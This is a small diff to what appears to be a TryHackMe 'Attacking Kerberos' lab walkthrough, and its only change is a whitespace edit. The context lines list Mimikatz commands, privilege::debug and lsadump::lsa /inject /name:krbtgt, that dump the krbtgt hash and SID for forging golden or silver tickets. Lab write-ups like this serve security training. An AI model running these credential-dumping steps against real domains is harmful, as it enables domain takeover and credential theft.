@@ -256,7 +256,7 @@ A golden ticket attack works by dumping the ticket-granting ticket of any user o
 
 ### Dump the krbtgt hash -
 ﻿1.) cd downloads && `mimikatz.exe` - navigate to the directory mimikatz is in and run mimikatz  
-2.) `privilege::debug` - ensure this outputs `[privilege '20' ok]`
+2.) `privilege::debug` - ensure this outputs `[privilege '20' ok]`  
 ﻿3.) `lsadump::lsa /inject /name:krbtgt` - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.  
  <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_25.png" width="50%" height="50%">  
 
